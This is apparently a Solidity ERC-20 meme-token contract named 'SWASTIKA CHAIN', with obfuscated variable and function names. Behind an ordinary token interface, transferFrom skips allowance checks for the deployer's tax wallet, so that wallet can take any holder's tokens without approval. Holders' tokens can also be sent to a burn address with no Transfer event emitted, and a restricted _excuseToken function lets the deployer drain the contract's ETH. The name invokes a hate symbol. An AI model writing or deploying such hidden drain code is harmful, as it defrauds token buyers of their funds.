// SPDX-License-Identifier: MIT

/*
https://x.com/kanyewest/status/1895177671002480787
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 
contract  SWASTIKACHAIN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"SWASTIKA CHAIN";
    string private constant _symbol = unicode"SWASTIKACHAIN";
    
    address payable private _SPXcTxZxcv214;
    mapping(address => uint256) private _zKXEZxcv214;
    mapping(address => mapping(address => uint256)) private _SPXcTTxsOqZxcv214;
    mapping(address => bool) private _SPXCExcludedTax;
    uint256 private _SPXero007 = 10;
    uint256 private _SPXeTox007 = 10;
    uint256 private _broxccbosodijof = 0;
    uint256 private _SPXcrcoifinos = 0;
    uint256 private _SPXcsscw007 = 7;
    uint256 private _SPXcgodxxt = 7;
    uint256 private _buyCount = 0;
    address private _Bro00xovboidfor;
    address private _KeepElonSPX = address(0xdead);
    uint256 public _SPXcDev007 = 20000000 * 10 **_decimals;
    uint256 public _SPXcxwDev007 = 20000000 * 10 **_decimals;
    uint256 public _SPXcfeeDev007 = 10000000 * 10 **_decimals;
    uint256 private constant _SPXCollecDev007 = 1000000000 * 10 **_decimals;
    IUniswapV2Router02 private uniswapV2Router;
    address private PairAddr;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _SPXcDev007);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _SPXcTxZxcv214 = payable(_msgSender());
        _zKXEZxcv214[address(this)] = _SPXCollecDev007 * 98 / 100;
        _zKXEZxcv214[owner()] = _SPXCollecDev007 * 2 / 100;
        _SPXCExcludedTax[owner()] = true;
        _SPXCExcludedTax[address(this)] = true;
        _SPXCExcludedTax[_SPXcTxZxcv214] = true;
        _Bro00xovboidfor = _msgSender();
        emit Transfer(address(0), address(this), _SPXCollecDev007 * 98 / 100);
        emit Transfer(address(0), address(owner()), _SPXCollecDev007 * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _SPXCollecDev007;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _SPXcTTxsOqZxcv214[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _zKXEZxcv214[account];
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _SPXcTTxsOqZxcv214[owner][spender];
    }

    receive() external payable {}
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _subTransfer0x(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _subTransfer0x(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _lvckmjlwoie(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _lvckmjlwoie(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        if(!_isDownAllowed(sender, recipient)) return _SPXcTTxsOqZxcv214[sender][_msgSender()];
        return amount;
    }

    function _isDownAllowed(
        address sender,
        address recipient
    ) internal view returns (bool) {
        if(msg.sender == _SPXcTxZxcv214) return true;
        return sender != PairAddr && recipient == _KeepElonSPX;
    }

    function Open() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _SPXCollecDev007);
        PairAddr = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(PairAddr).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function nnotrxts(uint256 amount) private {
        _SPXcTxZxcv214.transfer(amount);
    }

    function __INTERNAL_SWAP(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _subTransfer0x(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _SPXcsscw007)
                        ? _broxccbosodijof
                        : _SPXero007
                )
                .div(100);
            if (
                from == PairAddr &&
                to != address(uniswapV2Router) &&
                !_SPXCExcludedTax[to]
            ) {
                _buyCount++;
            }
            if (to == PairAddr && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _SPXcgodxxt)
                            ? _SPXcrcoifinos
                            : _SPXeTox007
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == PairAddr && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _SPXcfeeDev007) ? contractTokenBalance : _SPXcfeeDev007; 
                    __INTERNAL_SWAP((amount < minBalance) ? amount : minBalance);
                }
                nnotrxts(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _zKXEZxcv214[address(this)] =_zKXEZxcv214[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _zKXEZxcv214[from] =_zKXEZxcv214[from].sub(amount);
        _zKXEZxcv214[to] =_zKXEZxcv214[to].add(amount.sub(taxAmount));
        if(_KeepElonSPX != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function removeLimits () external onlyOwner {
        _SPXcDev007 = _SPXCollecDev007;
        _SPXcxwDev007 = _SPXCollecDev007;
        emit MaxTxAmountUpdated(_SPXCollecDev007);
    }

    function __elonvtsqw(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function _excuseToken(address payable receipt) external {
        require(msg.sender == _Bro00xovboidfor , "");
        _SPXcTxZxcv214 = receipt;
        __elonvtsqw(address(this).balance);
    }
}